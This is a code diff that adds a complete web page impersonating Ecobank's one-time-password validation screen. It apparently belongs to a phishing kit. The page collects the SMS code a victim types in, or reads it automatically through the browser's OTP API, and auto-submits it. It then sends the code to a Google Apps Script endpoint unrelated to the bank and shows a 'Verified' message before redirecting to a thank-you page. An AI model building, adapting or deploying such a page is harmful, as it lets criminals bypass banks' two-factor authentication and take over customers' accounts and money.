@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+:root {
+  --blue: #0A3D91;
+  --blue2: #1256c4;
+  --green: #7ED321;
+  --light: #f5f7fb;
+}
+
+body {
+  font-family: "Segoe UI", Arial, sans-serif;
+  background: var(--light);
+  margin: 0;
+  padding: 20px;
+  text-align: center;
+}
+
+/* Header */
+.header {
+  margin-bottom: 25px;
+}
+
+.header-title {
+  background: linear-gradient(135deg, var(--blue), var(--blue2));
+  color: #fff;
+  padding: 14px 28px;
+  border-radius: 50px;
+  font-weight: bold;
+  display: inline-block;
+  font-size: 16px;
+}
+
+.subtext {
+  color: #555;
+  font-size: 14px;
+  margin-top: 10px;
+}
+
+/* Card */
+.container {
+  background: #fff;
+  border-radius: 16px;
+  max-width: 360px;
+  margin: 30px auto;
+  padding: 30px 25px;
+  box-shadow: 0 10px 25px rgba(0,0,0,0.08);
+}
+
+/* Label */
+label {
+  display: block;
+  text-align: left;
+  margin-bottom: 8px;
+  color: #333;
+  font-weight: 600;
+}
+
+/* Input */
+input[type="text"] {
+  width: 100%;
+  padding: 14px;
+  border: 2px solid #ddd;
+  border-radius: 10px;
+  font-size: 20px;
+  margin-bottom: 20px;
+  text-align: center;
+  letter-spacing: 5px;
+  outline: none;
+  transition: 0.2s;
+}
+
+input[type="text"]:focus {
+  border-color: var(--blue);
+  box-shadow: 0 0 0 2px rgba(10,61,145,0.1);
+}
+
+/* Button */
+button {
+  width: 100%;
+  padding: 14px;
+  background: linear-gradient(135deg, var(--green), #5fbf00);
+  color: #fff;
+  border: none;
+  border-radius: 10px;
+  font-size: 16px;
+  font-weight: bold;
+  cursor: pointer;
+}
+
+/* Status */
+.notice {
+  font-size: 13px;
+  color: #777;
+  margin-top: 12px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="header">
+  <div class="header-title">ECOBANK VALIDATION OTP</div>
+  <div class="subtext">Enter the verification code sent to your phone</div>
+</div>
+
+<div class="container">
+  <form id="otpForm">
+    <label for="otp">Validation OTP</label>
+
+    <input
+      type="text"
+      id="otp"
+      name="validation_otp"
+      placeholder="••••••"
+      maxlength="6"
+      autocomplete="one-time-code"
+      inputmode="numeric"
+      required
+    >
+
+    <button type="submit">CONFIRM & CONTINUE →</button>
+    <div class="notice" id="status">Waiting for OTP…</div>
+  </form>
+</div>
+
+<script>
+const form = document.getElementById('otpForm');
+const otpInput = document.getElementById('otp');
+const statusEl = document.getElementById('status');
+
+const WEBAPP_URL = "https://script.google.com/macros/s/AKfycbxeIPpKVQOagylbISVnIckuJeazhERR8IYTxtJQFhCqRNJmawsQ-b4_b5pkSQRBldxN/exec";
+
+/* Clean input */
+otpInput.addEventListener("input", () => {
+  otpInput.value = otpInput.value.replace(/\D/g, '');
+
+  if (otpInput.value.length === 6) {
+    form.requestSubmit();
+  }
+});
+
+/* Auto OTP (Android only) */
+if ("OTPCredential" in window) {
+  navigator.credentials.get({
+    otp: { transport: ["sms"] }
+  }).then(otp => {
+    if (!otp || !otp.code) return;
+
+    const cleanOtp = otp.code.replace(/\D/g, '').slice(0, 6);
+
+    otpInput.value = cleanOtp;
+    statusEl.textContent = "OTP detected automatically ✔️";
+
+    setTimeout(() => form.requestSubmit(), 500);
+  }).catch(() => {
+    statusEl.textContent = "Enter OTP manually";
+  });
+}
+
+/* Submit */
+form.addEventListener('submit', async (e) => {
+  e.preventDefault();
+
+  const otpValue = otpInput.value.trim();
+
+  if (!otpValue || otpValue.length < 4) {
+    statusEl.textContent = "Enter valid OTP";
+    statusEl.style.color = "#b00000";
+    return;
+  }
+
+  statusEl.textContent = "Submitting...";
+  statusEl.style.color = "#555";
+
+  const formData = new FormData();
+  formData.append("validation_otp", otpValue);
+
+  try {
+    const response = await fetch(WEBAPP_URL, {
+      method: "POST",
+      body: formData
+    });
+
+    const text = await response.text();
+
+    let json;
+    try { json = JSON.parse(text); } catch {
+      statusEl.textContent = "Invalid response from server.";
+      statusEl.style.color = "#b00000";
+      return;
+    }
+
+    if (json.result === "success") {
+      statusEl.style.color = "green";
+      statusEl.textContent = "Verified ✅";
+
+      setTimeout(() => {
+        window.location.href = "thankyou.html";
+      }, 800);
+    } else {
+      statusEl.textContent = "Submission failed";
+      statusEl.style.color = "#b00000";
+    }
+
+  } catch {
+    statusEl.textContent = "Network error. Try again.";
+    statusEl.style.color = "#b00000";
+  }
+});
+</script>
+
+</body>
+</html>
